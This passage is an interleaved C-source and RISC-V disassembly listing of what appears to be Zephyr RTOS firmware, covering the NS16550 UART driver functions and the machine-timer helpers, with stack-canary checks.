80003c1c:	cf89                	beqz	a5,80003c36 <clock_control_get_rate+0x2e>
		return -ENOSYS;
	}

	return api->get_rate(dev, sys, rate);
80003c1e:	9782                	jalr	a5
}
80003c20:	8000c7b7          	lui	a5,0x8000c
80003c24:	4732                	lw	a4,12(sp)
80003c26:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003c2a:	8fb9                	xor	a5,a5,a4
80003c2c:	4701                	li	a4,0
80003c2e:	e799                	bnez	a5,80003c3c <clock_control_get_rate+0x34>
80003c30:	40f2                	lw	ra,28(sp)
80003c32:	6105                	addi	sp,sp,32
80003c34:	8082                	ret
		return -ENOSYS;
80003c36:	fa800513          	li	a0,-88
80003c3a:	b7dd                	j	80003c20 <clock_control_get_rate+0x18>
}
80003c3c:	0b6020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003c40 <set_baud_rate>:
	return config->port;
#endif
}

static void set_baud_rate(const struct device *dev, uint32_t baud_rate, uint32_t pclk)
{
80003c40:	1101                	addi	sp,sp,-32
80003c42:	ce06                	sw	ra,28(sp)
80003c44:	8000c7b7          	lui	a5,0x8000c
80003c48:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003c4c:	c63a                	sw	a4,12(sp)
80003c4e:	4701                	li	a4,0
	struct uart_ns16550_dev_data * const dev_data = dev->data;
80003c50:	4918                	lw	a4,16(a0)
	uint32_t divisor; /* baud rate divisor */
	uint8_t lcr_cache;

	if ((baud_rate != 0U) && (pclk != 0U)) {
80003c52:	c1b5                	beqz	a1,80003cb6 <set_baud_rate+0x76>
80003c54:	c22d                	beqz	a2,80003cb6 <set_baud_rate+0x76>
		/*
		 * calculate baud rate divisor. a variant of
		 * (uint32_t)(pclk / (16.0 * baud_rate) + 0.5)
		 */
		divisor = (pclk / (baud_rate << 4));
80003c56:	00459793          	slli	a5,a1,0x4
80003c5a:	02f65633          	divu	a2,a2,a5
	return DEVICE_MMIO_GET(dev);
80003c5e:	415c                	lw	a5,4(a0)
80003c60:	0007a803          	lw	a6,0(a5)
	return config->reg_interval;
80003c64:	0107c683          	lbu	a3,16(a5)

		/* set the DLAB to access the baud rate divisor registers */
		lcr_cache = INBYTE(LCR(dev));
80003c68:	00169793          	slli	a5,a3,0x1
80003c6c:	97b6                	add	a5,a5,a3
80003c6e:	97c2                	add	a5,a5,a6
extern "C" {
#endif

static ALWAYS_INLINE uint8_t sys_read8(mem_addr_t addr)
{
	return *(volatile uint8_t *)addr;
80003c70:	0007c683          	lbu	a3,0(a5)
80003c74:	0ff6f813          	zext.b	a6,a3
		OUTBYTE(LCR(dev), LCR_DLAB | lcr_cache);
80003c78:	0806e693          	ori	a3,a3,128
}

static ALWAYS_INLINE void sys_write8(uint8_t data, mem_addr_t addr)
{
	*(volatile uint8_t *)addr = data;
80003c7c:	00d78023          	sb	a3,0(a5)
		OUTBYTE(BRDL(dev), (unsigned char)(divisor & 0xff));
80003c80:	0ff67693          	zext.b	a3,a2
	const struct uart_ns16550_device_config *config = dev->config;
80003c84:	415c                	lw	a5,4(a0)
	return DEVICE_MMIO_GET(dev);
80003c86:	439c                	lw	a5,0(a5)
80003c88:	00d78023          	sb	a3,0(a5)
		OUTBYTE(BRDH(dev), (unsigned char)((divisor >> 8) & 0xff));
80003c8c:	8221                	srli	a2,a2,0x8
80003c8e:	0ff67613          	zext.b	a2,a2
	return DEVICE_MMIO_GET(dev);
80003c92:	415c                	lw	a5,4(a0)
80003c94:	4394                	lw	a3,0(a5)
	return config->reg_interval;
80003c96:	0107c783          	lbu	a5,16(a5)
		OUTBYTE(BRDH(dev), (unsigned char)((divisor >> 8) & 0xff));
80003c9a:	97b6                	add	a5,a5,a3
80003c9c:	00c78023          	sb	a2,0(a5)
	return DEVICE_MMIO_GET(dev);
80003ca0:	415c                	lw	a5,4(a0)
80003ca2:	4390                	lw	a2,0(a5)
	return config->reg_interval;
80003ca4:	0107c683          	lbu	a3,16(a5)

		/* restore the DLAB to access the baud rate divisor registers */
		OUTBYTE(LCR(dev), lcr_cache);
80003ca8:	00169793          	slli	a5,a3,0x1
80003cac:	97b6                	add	a5,a5,a3
80003cae:	97b2                	add	a5,a5,a2
80003cb0:	01078023          	sb	a6,0(a5)

		dev_data->uart_config.baudrate = baud_rate;
80003cb4:	c30c                	sw	a1,0(a4)
	}
}
80003cb6:	8000c7b7          	lui	a5,0x8000c
80003cba:	4732                	lw	a4,12(sp)
80003cbc:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003cc0:	8fb9                	xor	a5,a5,a4
80003cc2:	4701                	li	a4,0
80003cc4:	e781                	bnez	a5,80003ccc <set_baud_rate+0x8c>
80003cc6:	40f2                	lw	ra,28(sp)
80003cc8:	6105                	addi	sp,sp,32
80003cca:	8082                	ret
80003ccc:	026020ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003cd0 <uart_ns16550_config_get>:
};

#ifdef CONFIG_UART_USE_RUNTIME_CONFIGURE
static int uart_ns16550_config_get(const struct device *dev,
				   struct uart_config *cfg)
{
80003cd0:	1101                	addi	sp,sp,-32
80003cd2:	ce06                	sw	ra,28(sp)
80003cd4:	8000c737          	lui	a4,0x8000c
80003cd8:	95072783          	lw	a5,-1712(a4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003cdc:	c63e                	sw	a5,12(sp)
80003cde:	4781                	li	a5,0
	struct uart_ns16550_dev_data *data = dev->data;
80003ce0:	491c                	lw	a5,16(a0)

	cfg->baudrate = data->uart_config.baudrate;
80003ce2:	4394                	lw	a3,0(a5)
80003ce4:	c194                	sw	a3,0(a1)
	cfg->parity = data->uart_config.parity;
80003ce6:	0047c683          	lbu	a3,4(a5)
80003cea:	00d58223          	sb	a3,4(a1)
	cfg->stop_bits = data->uart_config.stop_bits;
80003cee:	0057c683          	lbu	a3,5(a5)
80003cf2:	00d582a3          	sb	a3,5(a1)
	cfg->data_bits = data->uart_config.data_bits;
80003cf6:	0067c683          	lbu	a3,6(a5)
80003cfa:	00d58323          	sb	a3,6(a1)
	cfg->flow_ctrl = data->uart_config.flow_ctrl;
80003cfe:	0077c783          	lbu	a5,7(a5)
80003d02:	00f583a3          	sb	a5,7(a1)

	return 0;
}
80003d06:	46b2                	lw	a3,12(sp)
80003d08:	95072783          	lw	a5,-1712(a4)
80003d0c:	8fb5                	xor	a5,a5,a3
80003d0e:	4681                	li	a3,0
80003d10:	e789                	bnez	a5,80003d1a <uart_ns16550_config_get+0x4a>
80003d12:	4501                	li	a0,0
80003d14:	40f2                	lw	ra,28(sp)
80003d16:	6105                	addi	sp,sp,32
80003d18:	8082                	ret
80003d1a:	7d9010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003d1e <uart_ns16550_poll_in>:
 * @param c Pointer to character
 *
 * @return 0 if a character arrived, -1 if the input buffer if empty.
 */
static int uart_ns16550_poll_in(const struct device *dev, unsigned char *c)
{
80003d1e:	1101                	addi	sp,sp,-32
80003d20:	ce06                	sw	ra,28(sp)
80003d22:	8000c7b7          	lui	a5,0x8000c
80003d26:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003d2a:	c63a                	sw	a4,12(sp)
80003d2c:	4701                	li	a4,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80003d2e:	30047773          	csrrci	a4,mstatus,8
	return DEVICE_MMIO_GET(dev);
80003d32:	415c                	lw	a5,4(a0)
80003d34:	4390                	lw	a2,0(a5)
	return config->reg_interval;
80003d36:	0107c683          	lbu	a3,16(a5)
	struct uart_ns16550_dev_data *data = dev->data;
	int ret = -1;
	k_spinlock_key_t key = k_spin_lock(&data->lock);

	if ((INBYTE(LSR(dev)) & LSR_RXRDY) != 0) {
80003d3a:	00269793          	slli	a5,a3,0x2
80003d3e:	97b6                	add	a5,a5,a3
80003d40:	97b2                	add	a5,a5,a2
	return *(volatile uint8_t *)addr;
80003d42:	0007c783          	lbu	a5,0(a5)
80003d46:	8b85                	andi	a5,a5,1
80003d48:	c78d                	beqz	a5,80003d72 <uart_ns16550_poll_in+0x54>
80003d4a:	00064783          	lbu	a5,0(a2) # 80000000 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000001>
		/* got a character */
		*c = INBYTE(RDR(dev));
80003d4e:	00f58023          	sb	a5,0(a1)
		ret = 0;
80003d52:	4501                	li	a0,0
	__asm__ volatile ("csrs mstatus, %0"
80003d54:	00877793          	andi	a5,a4,8
80003d58:	3007a073          	csrs	mstatus,a5
	}

	k_spin_unlock(&data->lock, key);

	return ret;
}
80003d5c:	8000c7b7          	lui	a5,0x8000c
80003d60:	4732                	lw	a4,12(sp)
80003d62:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003d66:	8fb9                	xor	a5,a5,a4
80003d68:	4701                	li	a4,0
80003d6a:	e791                	bnez	a5,80003d76 <uart_ns16550_poll_in+0x58>
80003d6c:	40f2                	lw	ra,28(sp)
80003d6e:	6105                	addi	sp,sp,32
80003d70:	8082                	ret
	int ret = -1;
80003d72:	557d                	li	a0,-1
80003d74:	b7c5                	j	80003d54 <uart_ns16550_poll_in+0x36>
}
80003d76:	77d010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003d7a <uart_ns16550_poll_out>:
 * @param dev UART device struct
 * @param c Character to send
 */
static void uart_ns16550_poll_out(const struct device *dev,
					   unsigned char c)
{
80003d7a:	1101                	addi	sp,sp,-32
80003d7c:	ce06                	sw	ra,28(sp)
80003d7e:	8000c7b7          	lui	a5,0x8000c
80003d82:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003d86:	c63a                	sw	a4,12(sp)
80003d88:	4701                	li	a4,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80003d8a:	30047673          	csrrci	a2,mstatus,8
	return DEVICE_MMIO_GET(dev);
80003d8e:	415c                	lw	a5,4(a0)
80003d90:	4394                	lw	a3,0(a5)
	return config->reg_interval;
80003d92:	0107c703          	lbu	a4,16(a5)
	struct uart_ns16550_dev_data *data = dev->data;
	k_spinlock_key_t key = k_spin_lock(&data->lock);

	while ((INBYTE(LSR(dev)) & LSR_THRE) == 0) {
80003d96:	00271793          	slli	a5,a4,0x2
80003d9a:	97ba                	add	a5,a5,a4
80003d9c:	97b6                	add	a5,a5,a3
80003d9e:	0007c783          	lbu	a5,0(a5)
80003da2:	0207f793          	andi	a5,a5,32
80003da6:	d7e5                	beqz	a5,80003d8e <uart_ns16550_poll_out+0x14>
	*(volatile uint8_t *)addr = data;
80003da8:	00b68023          	sb	a1,0(a3) # 90000000 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x90000001>
	__asm__ volatile ("csrs mstatus, %0"
80003dac:	00867793          	andi	a5,a2,8
80003db0:	3007a073          	csrs	mstatus,a5
	}

	OUTBYTE(THR(dev), c);

	k_spin_unlock(&data->lock, key);
}
80003db4:	8000c7b7          	lui	a5,0x8000c
80003db8:	4732                	lw	a4,12(sp)
80003dba:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003dbe:	8fb9                	xor	a5,a5,a4
80003dc0:	4701                	li	a4,0
80003dc2:	e781                	bnez	a5,80003dca <uart_ns16550_poll_out+0x50>
80003dc4:	40f2                	lw	ra,28(sp)
80003dc6:	6105                	addi	sp,sp,32
80003dc8:	8082                	ret
80003dca:	729010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003dce <uart_ns16550_err_check>:
 *
 * @return one of UART_ERROR_OVERRUN, UART_ERROR_PARITY, UART_ERROR_FRAMING,
 * UART_BREAK if an error was detected, 0 otherwise.
 */
static int uart_ns16550_err_check(const struct device *dev)
{
80003dce:	1101                	addi	sp,sp,-32
80003dd0:	ce06                	sw	ra,28(sp)
80003dd2:	8000c6b7          	lui	a3,0x8000c
80003dd6:	9506a783          	lw	a5,-1712(a3) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003dda:	c63e                	sw	a5,12(sp)
80003ddc:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80003dde:	30047773          	csrrci	a4,mstatus,8
	return DEVICE_MMIO_GET(dev);
80003de2:	415c                	lw	a5,4(a0)
80003de4:	438c                	lw	a1,0(a5)
	return config->reg_interval;
80003de6:	0107c603          	lbu	a2,16(a5)
	struct uart_ns16550_dev_data *data = dev->data;
	k_spinlock_key_t key = k_spin_lock(&data->lock);
	int check = (INBYTE(LSR(dev)) & LSR_EOB_MASK);
80003dea:	00261793          	slli	a5,a2,0x2
80003dee:	97b2                	add	a5,a5,a2
80003df0:	97ae                	add	a5,a5,a1
	return *(volatile uint8_t *)addr;
80003df2:	0007c503          	lbu	a0,0(a5)
	__asm__ volatile ("csrs mstatus, %0"
80003df6:	00877793          	andi	a5,a4,8
80003dfa:	3007a073          	csrs	mstatus,a5

	k_spin_unlock(&data->lock, key);

	return check >> 1;
}
80003dfe:	4732                	lw	a4,12(sp)
80003e00:	9506a783          	lw	a5,-1712(a3)
80003e04:	8fb9                	xor	a5,a5,a4
80003e06:	4701                	li	a4,0
80003e08:	e791                	bnez	a5,80003e14 <uart_ns16550_err_check+0x46>
80003e0a:	8979                	andi	a0,a0,30
80003e0c:	8505                	srai	a0,a0,0x1
80003e0e:	40f2                	lw	ra,28(sp)
80003e10:	6105                	addi	sp,sp,32
80003e12:	8082                	ret
80003e14:	6df010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003e18 <uart_ns16550_configure>:
{
80003e18:	7179                	addi	sp,sp,-48
80003e1a:	d606                	sw	ra,44(sp)
80003e1c:	d422                	sw	s0,40(sp)
80003e1e:	d226                	sw	s1,36(sp)
80003e20:	d04a                	sw	s2,32(sp)
80003e22:	ce4e                	sw	s3,28(sp)
80003e24:	cc52                	sw	s4,24(sp)
80003e26:	842a                	mv	s0,a0
80003e28:	84ae                	mv	s1,a1
80003e2a:	8000c7b7          	lui	a5,0x8000c
80003e2e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003e32:	c63a                	sw	a4,12(sp)
80003e34:	4701                	li	a4,0
	struct uart_ns16550_dev_data * const dev_data = dev->data;
80003e36:	01052a03          	lw	s4,16(a0)
	const struct uart_ns16550_device_config * const dev_cfg = dev->config;
80003e3a:	00452983          	lw	s3,4(a0)
	uint32_t pclk = 0U;
80003e3e:	c002                	sw	zero,0(sp)
	__asm__ volatile ("csrrc %0, mstatus, %1"
80003e40:	30047973          	csrrci	s2,mstatus,8
	if (dev_cfg->sys_clk_freq != 0U) {
80003e44:	0049a783          	lw	a5,4(s3)
80003e48:	c78d                	beqz	a5,80003e72 <uart_ns16550_configure+0x5a>
		pclk = dev_cfg->sys_clk_freq;
80003e4a:	c03e                	sw	a5,0(sp)
	set_baud_rate(dev, cfg->baudrate, pclk);
80003e4c:	4602                	lw	a2,0(sp)
80003e4e:	408c                	lw	a1,0(s1)
80003e50:	8522                	mv	a0,s0
80003e52:	33fd                	jal	80003c40 <set_baud_rate>
	switch (cfg->data_bits) {
80003e54:	0064c783          	lbu	a5,6(s1)
80003e58:	4709                	li	a4,2
80003e5a:	08e78563          	beq	a5,a4,80003ee4 <uart_ns16550_configure+0xcc>
80003e5e:	02f76963          	bltu	a4,a5,80003e90 <uart_ns16550_configure+0x78>
80003e62:	c3a9                	beqz	a5,80003ea4 <uart_ns16550_configure+0x8c>
80003e64:	4705                	li	a4,1
80003e66:	02e79263          	bne	a5,a4,80003e8a <uart_ns16550_configure+0x72>
		uart_cfg.data_bits = LCR_CS6;
80003e6a:	4785                	li	a5,1
80003e6c:	00f10523          	sb	a5,10(sp)
		break;
80003e70:	a825                	j	80003ea8 <uart_ns16550_configure+0x90>
		if (!device_is_ready(dev_cfg->clock_dev)) {
80003e72:	0089a503          	lw	a0,8(s3)
80003e76:	2b05                	jal	800043a6 <z_device_is_ready>
80003e78:	12050a63          	beqz	a0,80003fac <uart_ns16550_configure+0x194>
		clock_control_get_rate(dev_cfg->clock_dev, dev_cfg->clock_subsys,
80003e7c:	860a                	mv	a2,sp
80003e7e:	00c9a583          	lw	a1,12(s3)
80003e82:	0089a503          	lw	a0,8(s3)
80003e86:	3349                	jal	80003c08 <clock_control_get_rate>
80003e88:	b7d1                	j	80003e4c <uart_ns16550_configure+0x34>
	switch (cfg->data_bits) {
80003e8a:	f7a00513          	li	a0,-134
80003e8e:	a03d                	j	80003ebc <uart_ns16550_configure+0xa4>
80003e90:	470d                	li	a4,3
80003e92:	00e79663          	bne	a5,a4,80003e9e <uart_ns16550_configure+0x86>
		uart_cfg.data_bits = LCR_CS8;
80003e96:	478d                	li	a5,3
80003e98:	00f10523          	sb	a5,10(sp)
		break;
80003e9c:	a031                	j	80003ea8 <uart_ns16550_configure+0x90>
	switch (cfg->data_bits) {
80003e9e:	f7a00513          	li	a0,-134
80003ea2:	a829                	j	80003ebc <uart_ns16550_configure+0xa4>
		uart_cfg.data_bits = LCR_CS5;
80003ea4:	00010523          	sb	zero,10(sp)
	switch (cfg->stop_bits) {
80003ea8:	0054c783          	lbu	a5,5(s1)
80003eac:	4705                	li	a4,1
80003eae:	02e78f63          	beq	a5,a4,80003eec <uart_ns16550_configure+0xd4>
80003eb2:	470d                	li	a4,3
80003eb4:	04e78763          	beq	a5,a4,80003f02 <uart_ns16550_configure+0xea>
80003eb8:	f7a00513          	li	a0,-134
			  : "r" (key & MSTATUS_IEN)
80003ebc:	00897913          	andi	s2,s2,8
	__asm__ volatile ("csrs mstatus, %0"
80003ec0:	30092073          	csrs	mstatus,s2
};
80003ec4:	8000c7b7          	lui	a5,0x8000c
80003ec8:	4732                	lw	a4,12(sp)
80003eca:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003ece:	8fb9                	xor	a5,a5,a4
80003ed0:	4701                	li	a4,0
80003ed2:	eff9                	bnez	a5,80003fb0 <uart_ns16550_configure+0x198>
80003ed4:	50b2                	lw	ra,44(sp)
80003ed6:	5422                	lw	s0,40(sp)
80003ed8:	5492                	lw	s1,36(sp)
80003eda:	5902                	lw	s2,32(sp)
80003edc:	49f2                	lw	s3,28(sp)
80003ede:	4a62                	lw	s4,24(sp)
80003ee0:	6145                	addi	sp,sp,48
80003ee2:	8082                	ret
		uart_cfg.data_bits = LCR_CS7;
80003ee4:	4789                	li	a5,2
80003ee6:	00f10523          	sb	a5,10(sp)
		break;
80003eea:	bf7d                	j	80003ea8 <uart_ns16550_configure+0x90>
		uart_cfg.stop_bits = LCR_1_STB;
80003eec:	000104a3          	sb	zero,9(sp)
	switch (cfg->parity) {
80003ef0:	0044c783          	lbu	a5,4(s1)
80003ef4:	cb99                	beqz	a5,80003f0a <uart_ns16550_configure+0xf2>
80003ef6:	4709                	li	a4,2
80003ef8:	0ae78263          	beq	a5,a4,80003f9c <uart_ns16550_configure+0x184>
80003efc:	f7a00513          	li	a0,-134
80003f00:	bf75                	j	80003ebc <uart_ns16550_configure+0xa4>
		uart_cfg.stop_bits = LCR_2_STB;
80003f02:	4791                	li	a5,4
80003f04:	00f104a3          	sb	a5,9(sp)
		break;
80003f08:	b7e5                	j	80003ef0 <uart_ns16550_configure+0xd8>
		uart_cfg.parity = LCR_PDIS;
80003f0a:	00010423          	sb	zero,8(sp)
	dev_data->uart_config = *cfg;
80003f0e:	409c                	lw	a5,0(s1)
80003f10:	00fa2023          	sw	a5,0(s4)
80003f14:	40dc                	lw	a5,4(s1)
80003f16:	00fa2223          	sw	a5,4(s4)
	OUTBYTE(LCR(dev),
80003f1a:	00a14783          	lbu	a5,10(sp)
80003f1e:	00914683          	lbu	a3,9(sp)
80003f22:	00814703          	lbu	a4,8(sp)
80003f26:	8fd5                	or	a5,a5,a3
80003f28:	8f5d                	or	a4,a4,a5
	return DEVICE_MMIO_GET(dev);
80003f2a:	405c                	lw	a5,4(s0)
80003f2c:	4390                	lw	a2,0(a5)
	return config->reg_interval;
80003f2e:	0107c683          	lbu	a3,16(a5)
	OUTBYTE(LCR(dev),
80003f32:	00169793          	slli	a5,a3,0x1
80003f36:	97b6                	add	a5,a5,a3
80003f38:	97b2                	add	a5,a5,a2
	*(volatile uint8_t *)addr = data;
80003f3a:	00e78023          	sb	a4,0(a5)
	return DEVICE_MMIO_GET(dev);
80003f3e:	405c                	lw	a5,4(s0)
80003f40:	4398                	lw	a4,0(a5)
	return config->reg_interval;
80003f42:	0107c783          	lbu	a5,16(a5)
	OUTBYTE(MDC(dev), mdc);
80003f46:	078a                	slli	a5,a5,0x2
80003f48:	97ba                	add	a5,a5,a4
80003f4a:	472d                	li	a4,11
80003f4c:	00e78023          	sb	a4,0(a5)
	return DEVICE_MMIO_GET(dev);
80003f50:	405c                	lw	a5,4(s0)
80003f52:	4398                	lw	a4,0(a5)
	return config->reg_interval;
80003f54:	0107c783          	lbu	a5,16(a5)
	OUTBYTE(FCR(dev),
80003f58:	0786                	slli	a5,a5,0x1
80003f5a:	97ba                	add	a5,a5,a4
80003f5c:	f8700713          	li	a4,-121
80003f60:	00e78023          	sb	a4,0(a5)
	return DEVICE_MMIO_GET(dev);
80003f64:	405c                	lw	a5,4(s0)
80003f66:	4398                	lw	a4,0(a5)
	return config->reg_interval;
80003f68:	0107c783          	lbu	a5,16(a5)
	if ((INBYTE(IIR(dev)) & IIR_FE) == IIR_FE) {
80003f6c:	0786                	slli	a5,a5,0x1
80003f6e:	97ba                	add	a5,a5,a4
	return *(volatile uint8_t *)addr;
80003f70:	0007c783          	lbu	a5,0(a5)
80003f74:	0c07f793          	andi	a5,a5,192
80003f78:	0c000713          	li	a4,192
80003f7c:	02e78463          	beq	a5,a4,80003fa4 <uart_ns16550_configure+0x18c>
		dev_data->fifo_size = 1;
80003f80:	4785                	li	a5,1
80003f82:	00fa0423          	sb	a5,8(s4)
	const struct uart_ns16550_device_config *config = dev->config;
80003f86:	4058                	lw	a4,4(s0)
	return config->reg_interval;
80003f88:	01074783          	lbu	a5,16(a4)
	return DEVICE_MMIO_GET(dev);
80003f8c:	4318                	lw	a4,0(a4)
80003f8e:	00074683          	lbu	a3,0(a4)
	OUTBYTE(IER(dev), 0x00);
80003f92:	97ba                	add	a5,a5,a4
	*(volatile uint8_t *)addr = data;
80003f94:	00078023          	sb	zero,0(a5)
	int ret = 0;
80003f98:	4501                	li	a0,0
}
80003f9a:	b70d                	j	80003ebc <uart_ns16550_configure+0xa4>
		uart_cfg.parity = LCR_EPS;
80003f9c:	47c1                	li	a5,16
80003f9e:	00f10423          	sb	a5,8(sp)
		break;
80003fa2:	b7b5                	j	80003f0e <uart_ns16550_configure+0xf6>
		dev_data->fifo_size = 16;
80003fa4:	47c1                	li	a5,16
80003fa6:	00fa0423          	sb	a5,8(s4)
80003faa:	bff1                	j	80003f86 <uart_ns16550_configure+0x16e>
			ret = -EINVAL;
80003fac:	5529                	li	a0,-22
80003fae:	b739                	j	80003ebc <uart_ns16550_configure+0xa4>
};
80003fb0:	543010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003fb4 <uart_ns16550_init>:
{
80003fb4:	1101                	addi	sp,sp,-32
80003fb6:	ce06                	sw	ra,28(sp)
80003fb8:	cc22                	sw	s0,24(sp)
80003fba:	8000c437          	lui	s0,0x8000c
80003fbe:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003fc2:	c63e                	sw	a5,12(sp)
80003fc4:	4781                	li	a5,0
	ret = uart_ns16550_configure(dev, &data->uart_config);
80003fc6:	490c                	lw	a1,16(a0)
80003fc8:	3d81                	jal	80003e18 <uart_ns16550_configure>
}
80003fca:	4732                	lw	a4,12(sp)
80003fcc:	95042783          	lw	a5,-1712(s0)
80003fd0:	8fb9                	xor	a5,a5,a4
80003fd2:	4701                	li	a4,0
80003fd4:	e789                	bnez	a5,80003fde <uart_ns16550_init+0x2a>
80003fd6:	40f2                	lw	ra,28(sp)
80003fd8:	4462                	lw	s0,24(sp)
80003fda:	6105                	addi	sp,sp,32
80003fdc:	8082                	ret
80003fde:	515010ef          	jal	ra,80005cf2 <_StackCheckHandler>

80003fe2 <get_hart_mtimecmp>:
#if defined(CONFIG_TEST)
const int32_t z_sys_timer_irq_for_test = TIMER_IRQN;
#endif

static uint64_t get_hart_mtimecmp(void)
{
80003fe2:	1101                	addi	sp,sp,-32
80003fe4:	ce06                	sw	ra,28(sp)
80003fe6:	8000c737          	lui	a4,0x8000c
80003fea:	95072783          	lw	a5,-1712(a4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80003fee:	c63e                	sw	a5,12(sp)
80003ff0:	4781                	li	a5,0
	return MTIMECMP_REG + (_current_cpu->id * 8);
80003ff2:	800097b7          	lui	a5,0x80009
80003ff6:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80003ffa:	0147c503          	lbu	a0,20(a5)
80003ffe:	050e                	slli	a0,a0,0x3
80004000:	020047b7          	lui	a5,0x2004
80004004:	953e                	add	a0,a0,a5
}
80004006:	46b2                	lw	a3,12(sp)
80004008:	95072783          	lw	a5,-1712(a4)
8000400c:	8fb5                	xor	a5,a5,a3
8000400e:	4681                	li	a3,0
80004010:	e789                	bnez	a5,8000401a <get_hart_mtimecmp+0x38>
80004012:	4581                	li	a1,0
80004014:	40f2                	lw	ra,28(sp)
80004016:	6105                	addi	sp,sp,32
80004018:	8082                	ret
8000401a:	4d9010ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000401e <set_mtimecmp>:

static void set_mtimecmp(uint64_t time)
{
8000401e:	1101                	addi	sp,sp,-32
80004020:	ce06                	sw	ra,28(sp)
80004022:	cc22                	sw	s0,24(sp)
80004024:	ca26                	sw	s1,20(sp)
80004026:	c84a                	sw	s2,16(sp)
80004028:	84aa                	mv	s1,a0
8000402a:	842e                	mv	s0,a1
8000402c:	8000c937          	lui	s2,0x8000c
80004030:	95092783          	lw	a5,-1712(s2) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80004034:	c63e                	sw	a5,12(sp)
80004036:	4781                	li	a5,0
#ifdef CONFIG_64BIT
	*(volatile uint64_t *)get_hart_mtimecmp() = time;
#else
	volatile uint32_t *r = (uint32_t *)(uint32_t)get_hart_mtimecmp();
80004038:	376d                	jal	80003fe2 <get_hart_mtimecmp>
	 * but are NOT internally latched for multiword transfers.  So
	 * we have to be careful about sequencing to avoid triggering
	 * spurious interrupts: always set the high word to a max
	 * value first.
	 */
	r[1] = 0xffffffff;
8000403a:	57fd                	li	a5,-1
8000403c:	c15c                	sw	a5,4(a0)
	r[0] = (uint32_t)time;
8000403e:	c104                	sw	s1,0(a0)
	r[1] = (uint32_t)(time >> 32);
80004040:	c140                	sw	s0,4(a0)
#endif
}
80004042:	4732                	lw	a4,12(sp)
80004044:	95092783          	lw	a5,-1712(s2)
80004048:	8fb9                	xor	a5,a5,a4
8000404a:	4701                	li	a4,0
8000404c:	e799                	bnez	a5,8000405a <set_mtimecmp+0x3c>
8000404e:	40f2                	lw	ra,28(sp)
80004050:	4462                	lw	s0,24(sp)
80004052:	44d2                	lw	s1,20(sp)
80004054:	4942                	lw	s2,16(sp)
80004056:	6105                	addi	sp,sp,32
80004058:	8082                	ret
8000405a:	499010ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000405e <mtime>:

static uint64_t mtime(void)
{
8000405e:	1101                	addi	sp,sp,-32
80004060:	ce06                	sw	ra,28(sp)
80004062:	8000c7b7          	lui	a5,0x8000c
80004066:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000406a:	c63a                	sw	a4,12(sp)
8000406c:	4701                	li	a4,0
	volatile uint32_t *r = (uint32_t *)MTIME_REG;
	uint32_t lo, hi;

	/* Likewise, must guard against rollover when reading */
	do {
		hi = r[1];
8000406e:	0200c7b7          	lui	a5,0x200c
80004072:	ffc7a583          	lw	a1,-4(a5) # 200bffc <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x168297c>
		lo = r[0];
80004076:	ff87a503          	lw	a0,-8(a5)
	} while (r[1] != hi);
8000407a:	ffc7a783          	lw	a5,-4(a5)
8000407e:	feb798e3          	bne	a5,a1,8000406e <mtime+0x10>

	return (((uint64_t)hi) << 32) | lo;
#endif
}
80004082:	8000c7b7          	lui	a5,0x8000c
80004086:	4732                	lw	a4,12(sp)
80004088:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000408c:	8fb9                	xor	a5,a5,a4
8000408e:	4701                	li	a4,0
80004090:	e781                	bnez	a5,80004098 <mtime+0x3a>
80004092:	40f2                	lw	ra,28(sp)
80004094:	6105                	addi	sp,sp,32
80004096:	8082                	ret
80004098:	45b010ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000409c <sys_clock_driver_init>:
{
	return (mtime() << CONFIG_RISCV_MACHINE_TIMER_SYSTEM_CLOCK_DIVIDER);
}

static int sys_clock_driver_init(const struct device *dev)
{
8000409c:	1101                	addi	sp,sp,-32
